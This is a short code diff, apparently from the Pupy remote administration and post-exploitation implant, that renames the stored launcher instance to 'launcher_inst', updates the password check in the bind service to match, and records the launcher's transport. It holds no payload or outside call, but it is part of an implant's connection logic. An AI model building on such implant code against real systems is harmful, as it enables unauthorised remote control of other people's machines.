@@ -101,7 +101,7 @@ class BindSlaveService(ReverseSlaveService):
 		self.exposed_namespace = {}
 		self._conn._config.update(REVERSE_SLAVE_CONF)
 		import pupy
-		if self._conn.root.get_password() != pupy.infos['launcher'].args.password:
+		if self._conn.root.get_password() != pupy.infos['launcher_inst'].args.password:
 			self._conn.close()
 			raise KeyboardInterrupt("wrong password")
 		self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
@@ -170,7 +170,8 @@ def main():
 			pupy.infos={} #global dictionary to store informations persistent through a deconnection
 			pupy.infos['launcher']=LAUNCHER
 			pupy.infos['launcher_args']=LAUNCHER_ARGS
-			pupy.infos['launcher']=launcher
+			pupy.infos['launcher_inst']=launcher
+			pupy.infos['transport']=launcher.get_transport()
 			rpyc_loop(launcher)
 
 		finally:
